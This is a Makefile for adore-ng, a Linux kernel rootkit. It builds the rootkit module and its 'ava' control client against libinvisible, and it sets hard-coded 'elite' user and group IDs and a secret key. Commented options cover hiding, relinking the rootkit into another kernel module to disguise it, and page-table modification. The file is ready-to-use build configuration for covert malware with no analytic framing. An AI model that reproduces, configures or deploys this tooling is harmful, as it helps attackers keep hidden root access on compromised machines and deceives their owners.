# New kbuild based Makefile for 2.6 kernel
# Edit ELITE_UID etc. and copy to 'Makefile'
# then type 'make'

EXTRA_CFLAGS=-DELITE_UID=2618748389U -DELITE_GID=4063569279U
EXTRA_CFLAGS+=-DCURRENT_ADORE=56
EXTRA_CFLAGS+=-DADORE_KEY=\"fgjgggfd\"

#EXTRA_CFLAGS+=-DHIDE

# Enable this so it expects itself to be relinked into another LKM with
# 'relink26' script. If compiled with this switch, it cant
# be loaded stand alone.
#EXTRA_CFLAGS+=-DRELINKED

#EXTRA_CFLAGS+=-D__SMP__			# enable this for SMP systems

# comment this out if your dmesg tells you that the version
# magic strings from adore-ng differ from your kernel one's
# you need to change the adore-ng-2.6.c file VERSION_MAGIC
# at the end of the file to match your version
#EXTRA_CFLAGS+=-DCROSS_BUILD

EXTRA_CFLAGS+=-DMODIFY_PAGE_TABLES
EXTRA_CFLAGS+=-DFOUR_LEVEL_PAGING


#KERNEL_SOURCE=/usr/src/linux
KERNELBUILD := /lib/modules/$(shell uname -r)/build

obj-m += adore-ng.o

default: ava adore

adore:
	make -C $(KERNELBUILD) M=$(shell pwd) modules

ava: ava.c libinvisible.c
	$(CC) $(EXTRA_CFLAGS) ava.c libinvisible.c -o ava

clean:
	rm -f core ava *.ko *.o
	rm -f *mod* Module*
